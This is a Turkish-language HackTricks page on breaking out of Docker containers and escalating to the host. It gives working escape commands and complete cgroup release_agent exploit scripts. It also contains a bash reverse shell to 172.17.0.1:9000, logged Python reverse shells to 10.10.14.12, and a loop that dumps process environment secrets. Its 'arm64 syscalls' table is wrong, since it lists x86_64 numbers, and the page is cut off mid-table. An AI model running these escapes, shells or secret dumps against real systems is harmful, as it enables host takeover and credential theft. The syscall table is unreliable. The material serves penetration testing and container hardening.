# Docker Kaçışı / Ayrıcalık Yükseltme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi göndererek **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturmak ve otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Otomatik Sıralama ve Kaçış

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Ayrıca **konteynerleri sıralayabilir**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Bu araç, içinde bulunduğunuz konteyneri sıralamak ve hatta otomatik olarak kaçmaya çalışmak için oldukça **yararlıdır**
* [**amicontained**](https://github.com/genuinetools/amicontained): Kaçmak için konteynerin sahip olduğu ayrıcalıkları bulmak için kullanışlı bir araç
* [**deepce**](https://github.com/stealthcopter/deepce): Konteynerleri sıralamak ve kaçmak için araç
* [**grype**](https://github.com/anchore/grype): Görüntüye yüklenen yazılımda bulunan CVE'leri alın

## Bağlanmış Docker Soketi Kaçışı

Eğer bir şekilde **docker soketinin bağlandığını** bulursanız, ondan kaçabilirsiniz.\
Bu genellikle bazı nedenlerle docker konteynerlerinin eylemler gerçekleştirmek için docker daemon'a bağlanması gerektiği durumlarda olur.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Bu durumda, docker komutlarını kullanarak docker daemon ile iletişim kurabilirsiniz:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Eğer **docker soketi beklenmedik bir yerde** ise, yine de **`docker`** komutunu **`-H unix:///path/to/docker.sock`** parametresiyle kullanarak onunla iletişim kurabilirsiniz.
{% endhint %}

Docker daemon ayrıca bir portta (varsayılan olarak 2375, 2376) dinleyebilir veya Systemd tabanlı sistemlerde Docker daemon ile iletişim Systemd soketi `fd://` üzerinden gerçekleşebilir.

{% hint style="info" %}
Ayrıca, diğer yüksek seviye çalışma zamanlarının çalışma zamanı soketlerine dikkat edin:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Yeteneklerin Kötüye Kullanılması ve Kaçış

Konteynerin yeteneklerini kontrol etmelisiniz, eğer aşağıdakilerden herhangi birine sahipse, ondan kaçabilirsiniz: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Mevcut konteyner yeteneklerini **önceden bahsedilen otomatik araçlar** veya aşağıdaki komutu kullanarak kontrol edebilirsiniz:
```bash
capsh --print
```
Aşağıdaki sayfada, linux yetenekleri hakkında daha fazla bilgi edinebilir ve bunları kötüye kullanarak ayrıcalıkları kaçırabilir/yükselebilirsiniz:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Ayrıcalıklı Konteynerden Kaçış

Ayrıcalıklı bir konteyner, `--privileged` bayrağıyla veya belirli savunmaları devre dışı bırakarak oluşturulabilir:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev` bağlama

`--privileged` bayrağı, konteyner güvenliğini önemli ölçüde düşürerek **sınırsız cihaz erişimi** sunar ve **birçok korumayı atlar**. Detaylı bir açıklama için, `--privileged`'in tam etkileri hakkındaki belgelere başvurun.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Bu izinlerle, sadece root olarak çalışan bir işlemin (pid:1) ad alanına geçebilirsiniz, örneğin init, sadece şunu çalıştırarak: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Bunu bir konteynerde test etmek için şunu çalıştırın:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Ayrıcalıklı

Sadece ayrıcalıklı bayrağıyla, **ana bilgisayarın diskine erişmeyi** veya **release\_agent veya diğer kaçışları kötüye kullanarak kaçmayı** deneyebilirsiniz.

Aşağıdaki bypassları bir konteynerde test etmek için şunları çalıştırın:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Diski Mount Etme - Poc1

İyi yapılandırılmış docker konteynerleri, **fdisk -l** gibi komutlara izin vermez. Ancak, yanlış yapılandırılmış bir docker komutunda `--privileged` veya `--device=/dev/sda1` bayrağı ile birlikte caps belirtilirse, ana makinedeki sürücüyü görmek için ayrıcalıklara sahip olmak mümkündür.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Bu nedenle, ana makineyi ele geçirmek oldukça basittir:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Ve işte! Şimdi, ana bilgisayarın dosya sistemine `/mnt/hola` klasöründe bağlanabilirsiniz.

#### Disk Bağlama - Poc2

Kapsayıcı içinde, saldırgan küme tarafından oluşturulan yazılabilir bir hostPath birimi aracılığıyla altta yatan ana işletim sistemine daha fazla erişim elde etmeye çalışabilir. Aşağıda, bu saldırgan vektörünü kullanıp kullanmadığınızı kontrol etmek için kapsayıcı içinde kontrol edebileceğiniz yaygın bazı şeyler bulunmaktadır:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Mevcut release\_agent'i kötüye kullanarak ayrıcalıklı kaçış ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="İlk PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Oluşturulan release\_agent'i Kullanarak Yetkili Kaçışı Yapma ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="İkinci PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Tekniğin açıklamasını bulun:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Bilinen bir yol olmadan release\_agent'i suiistimal ederek Privilege Escape - PoC3

Önceki saldırılarda, **konumun mutlak yolu** ortaya çıkarılmıştır. Ancak, her zaman böyle olmaz. Eğer **konumun mutlak yolunu bilmiyorsanız**, bu teknik kullanılabilir:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Ayrıcalıklı bir konteyner içinde PoC'yi çalıştırmak, benzer bir çıktı sağlamalıdır:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Hassas Mountları Kötüye Kullanarak Yetkili Kaçışı

Altta yatan ana bilgisayar hakkında bilgi veren birkaç dosya mevcuttur. Bunlardan bazıları, ana bilgisayarın bir şey olduğunda çalıştırılmasını gerektirebilir (bu da saldırganın konteynerden kaçmasına izin verecektir).\
Bu dosyaların kötüye kullanımı, şunlara izin verebilir:

* release\_agent (daha önce ele alındı)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Ancak, bu sayfada kontrol etmek için **diğer hassas dosyaları** bulabilirsiniz:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Rastgele Mountlar

Birkaç durumda, **konteynerin ana bilgisayardan bir hacim bağlandığını** göreceksiniz. Bu hacim doğru şekilde yapılandırılmamışsa, **hassas verilere erişebilir/değiştirebilirsiniz**: Gizli bilgileri okuyun, ssh authorized\_keys'ı değiştirin...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 kabuk ve ana bilgisayar bağlantısı ile Yetki Yükseltme

Eğer **bir konteyner içinde root erişimine** sahipseniz ve ana bilgisayardan bazı klasörlerin bağlandığı bir konteyneriniz varsa ve **sınırlı yetkili bir kullanıcı olarak ana bilgisayara kaçmayı başardıysanız** ve bağlanmış klasöre okuma erişiminiz varsa.\
Konteynerin içindeki **bağlanmış klasöre bir bash suid dosyası** oluşturabilir ve **ana bilgisayardan** bu dosyayı çalıştırarak yetki yükseltebilirsiniz.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 kabukla Ayrıcalık Yükseltme

Eğer bir konteyner içinde **root erişimine** sahipseniz ve bir **yetkisiz kullanıcı olarak ana bilgisayara kaçmayı başardıysanız**, konteyner içindeki MKNOD yeteneğini (varsayılan olarak mevcuttur) kullanarak hem konteyner içinde hem de ana bilgisayarda **ayrıcalık yükseltebilirsiniz**. Bu, [**bu yazıda açıklandığı gibi**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) mümkündür.\
Bu yetenekle birlikte, konteyner içindeki root kullanıcısı **blok cihaz dosyaları oluşturabilir**. Cihaz dosyaları, **altta yatan donanım ve çekirdek modüllerine erişmek** için kullanılan özel dosyalardır. Örneğin, /dev/sda blok cihaz dosyası, sistem diskindeki ham verilere **okuma erişimi sağlar**.

Docker, konteynerler içinde blok cihazlarının yanlış kullanımına karşı koruma sağlamak için bir cgroup politikası uygulayarak **blok cihazı okuma/yazma işlemlerini engeller**. Bununla birlikte, bir blok cihazı **konteyner içinde oluşturulursa**, bu cihaz dışarıdan **/proc/PID/root/** dizini üzerinden erişilebilir hale gelir. Bu erişim, sürecin sahibinin hem konteyner içinde hem de dışında aynı olmasını gerektirir.

Bu [**yazıda**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) verilen örnekteki **sömürü** örneği:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Eğer hedef makinenin işlemlerine erişebiliyorsanız, bu işlemlerde depolanan hassas bilgilere erişebilirsiniz. Test laboratuvarını çalıştırın:
```
docker run --rm -it --pid=host ubuntu bash
```
Örneğin, `ps auxn` gibi bir şey kullanarak işlemleri listeleyebilir ve komutlarda hassas bilgiler arayabilirsiniz.

Ardından, **/proc/ içindeki her bir işleme erişebileceğiniz için, env gizliliklerini çalmak için** şunları çalıştırabilirsiniz:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Diğer işlemlerin dosya tanımlayıcılarına erişebilir ve açık dosyalarını okuyabilirsiniz:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Ayrıca **süreçleri sonlandırabilir ve bir DoS saldırısı yapabilirsiniz**.

{% hint style="warning" %}
Eğer bir şekilde **konteyner dışındaki bir sürece ayrıcalıklı erişiminiz varsa**, `nsenter --target <pid> --all` veya `nsenter --target <pid> --mount --net --pid --cgroup` gibi bir komut çalıştırarak, umarım hiçbir kısıtlama olmadan aynı ns kısıtlamalarıyla bir kabuk çalıştırabilirsiniz.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Eğer bir konteyner Docker [ana ağ sürücüsüyle (`--network=host`)](https://docs.docker.com/network/host/) yapılandırılmışsa, bu konteynerin ağ yığını Docker ana bilgisayardan izole edilmez (konteyner ana bilgisayarın ağ ad alanını paylaşır) ve konteynerin ayrı bir IP adresi tahsis edilmez. Başka bir deyişle, **konteyner tüm hizmetleri doğrudan ana bilgisayarın IP'sine bağlar**. Ayrıca, konteyner, paylaşılan arayüz üzerinden gönderilen ve alınan **tüm ağ trafiğini yakalayabilir** (`tcpdump -i eth0`).

Örneğin, bu yöntemi kullanarak ana bilgisayar ve meta veri örneği arasındaki trafiği **dinleyebilir ve hatta sahteleyebilirsiniz**.

Aşağıdaki örneklerde olduğu gibi:

* [Yazı: Google SRE ile iletişim kurma: Bulut SQL'de kabuk bırakma](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Meta veri hizmeti MITM, kök ayrıcalıklarının yükseltilmesine izin verir (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Ayrıca, ana bilgisayar içinde **localhost'a bağlı ağ hizmetlerine erişebilir** veya hatta **düğümün meta veri izinlerine** (bir konteynerin erişebileceğinden farklı olabilir) erişebilirsiniz.

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true` ile, **/dev/shm** içindeki **paylaşılan bellek** gibi ana bilgisayarın süreçler arası iletişim (IPC) kaynaklarına erişim sağlarsınız. Bu, aynı IPC kaynaklarının diğer ana bilgisayar veya pod süreçleri tarafından kullanıldığı yerlerde okuma/yazma yapmanıza olanak tanır. Bu IPC mekanizmalarını daha ayrıntılı olarak incelemek için `ipcs` komutunu kullanın.

* **/dev/shm'yi inceleyin** - Bu paylaşılan bellek konumunda herhangi bir dosyayı arayın: `ls -la /dev/shm`
* **Mevcut IPC tesislerini inceleyin** - `/usr/bin/ipcs` ile kullanılan herhangi bir IPC tesisi olup olmadığını kontrol edebilirsiniz. Şu şekilde kontrol edin: `ipcs -a`

### Yetenekleri Kurtar

Syscall **`unshare`** yasaklanmamışsa, tüm yetenekleri kurtarabilirsiniz:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Simgeleme aracılığıyla kullanıcı ad alanı kötüye kullanımı

[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) adresinde açıklanan ikinci teknik, kullanıcı ad alanlarıyla bağlantılı bağ montajlarını kötüye kullanarak ana makinedeki dosyalara etki etmenizi sağlar (bu özel durumda dosyaları siler).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturabilir ve otomatikleştirebilirsiniz.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE'ler

### Runc saldırısı (CVE-2019-5736)

`docker exec` komutunu kök olarak çalıştırabiliyorsanız (muhtemelen sudo ile), CVE-2019-5736'yi kötüye kullanarak bir konteynerden ayrılarak ayrıcalıkları yükseltmeyi deneyebilirsiniz (saldırı [burada](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Bu teknik temel olarak **ana makinedeki** _**/bin/sh**_ ikili dosyasını bir **konteynerden üzerine yazar**, bu nedenle docker exec komutunu çalıştıran herhangi biri payload'u tetikleyebilir.

Payload'u değiştirin ve `go build main.go` ile main.go'yu derleyin. Oluşan ikili dosya, yürütme için docker konteynerine yerleştirilmelidir.\
Yürütme yapıldığında, `[+] Overwritten /bin/sh successfully` mesajını görüntülediğinde, aşağıdaki komutu ana makineden çalıştırmanız gerekmektedir:

`docker exec -it <container-adı> /bin/sh`

Bu, main.go dosyasında bulunan payload'u tetikleyecektir.

Daha fazla bilgi için: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Konteynerin savunmasız olabileceği diğer CVE'ler bulunmaktadır, bir liste [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) adresinde bulunabilir.
{% endhint %}

## Docker Özel Kaçış

### Docker Kaçış Yüzeyi

* **Ad alanları:** İşlem, ad alanları aracılığıyla diğer işlemlerle tamamen ayrılmış olmalıdır, bu nedenle ad alanları nedeniyle diğer işlemlerle etkileşime geçilemez (IPC'ler, unix soketleri, ağ hizmetleri, D-Bus, diğer işlemlerin `/proc`'uyla iletişim kurulamaz).
* **Kök kullanıcı**: Varsayılan olarak, işlemi çalıştıran kullanıcı kök kullanıcısıdır (ancak ayrıcalıkları sınırlıdır).
* **Yetenekler**: Docker, aşağıdaki yetenekleri bırakır: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Sistem çağrıları**: Bunlar, **kök kullanıcının** çağırabileceği sistem çağrılarıdır (yetenek eksikliği + Seccomp nedeniyle çağırılamayanlar). Kaçmaya çalışmak için diğer sistem çağrıları kullanılabilir.

{% tabs %}
{% tab title="x64 sistem çağrıları" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64 syscalls" %}

Bu bölümde, arm64 mimarisinde kullanılan bazı önemli sistem çağrılarını bulacaksınız. Bu sistem çağrıları, arm64 tabanlı bir sistemdeki işletim sistemi işlevlerine doğrudan erişim sağlar.

| Sistem Çağrısı Numarası | Sistem Çağrısı Adı |
| ---------------------- | ----------------- |
| 0                      | read              |
| 1                      | write             |
| 2                      | open              |
| 3                      | close             |
| 4                      | stat              |
| 5                      | fstat             |
| 6                      | lstat             |
| 7                      | poll              |
| 8                      | lseek             |
| 9                      | mmap              |
| 10                     | mprotect          |
| 11                     | munmap            |
| 12                     | brk               |
| 13                     | rt_sigaction      |
| 14                     | rt_sigprocmask    |
| 15                     | rt_sigreturn      |
| 16                     | ioctl             |
| 17                     | pread64           |
| 18                     | pwrite64          |
| 19                     | readv             |
| 20                     | writev            |
| 21                     | access            |
| 22                     | pipe              |
| 23                     | select            |
| 24                     | sched_yield       |
| 25                     | mremap            |
| 26                     | msync             |
| 27                     | mincore           |
| 28                     | madvise           |
| 29                     | shmget            |
| 30                     | shmat             |
| 31                     | shmctl            |
| 32                     | dup               |
| 33                     | dup2              |
| 34                     | pause             |
| 35                     | nanosleep         |
| 36                     | getitimer         |
| 37                     | alarm             |
| 38                     | setitimer         |
| 39                     | getpid            |
| 40                     | sendfile          |
| 41                     | socket            |
| 42                     | connect           |
| 43                     | accept            |
| 44                     | sendto            |
| 45                     | recvfrom          |
| 46                     | sendmsg           |
| 47                     | recvmsg           |
| 48                     | shutdown          |
| 49                     | bind              |
| 50                     | listen            |
| 51                     | getsockname       |
| 52                     | getpeername       |
| 53                     | socketpair        |
| 54                     | setsockopt        |
| 55                     | getsockopt        |
| 56                     | clone             |
| 57                     | fork              |
| 58                     | vfork             |
| 59                     | execve            |
| 60                     | exit              |
| 61                     | wait4             |
| 62                     | kill              |
| 63                     | uname             |
| 64                     | semget            |
| 65                     | semop             |
| 66                     | semctl            |
| 67                     | shmdt             |
| 68                     | msgget            |
| 69                     | msgsnd            |
| 70                     | msgrcv            |
| 71                     | msgctl            |
| 72                     | fcntl             |
| 73                     | flock             |
| 74                     | fsync             |
| 75                     | fdatasync         |
| 76                     | truncate          |
| 77                     | ftruncate         |
| 78                     | getdents          |
| 79                     | getcwd            |
| 80                     | chdir             |
| 81                     | fchdir            |
| 82                     | rename            |
| 83                     | mkdir             |
| 84                     | rmdir             |
| 85                     | creat             |
| 86                     | link              |
| 87                     | unlink            |
| 88                     | symlink           |
| 89                     | readlink          |
| 90                     | chmod             |
| 91                     | fchmod            |
| 92                     | chown             |
| 93                     | fchown            |
| 94                     | lchown            |
| 95                     | umask             |
| 96                     | gettimeofday     |
| 97                     | getrlimit         |
| 98                     | getrusage         |
| 99                     | sysinfo           |
| 100                    | times             |
| 101                    | ptrace            |
| 102                    | getuid            |
| 103                    | syslog            |
| 104                    | getgid            |
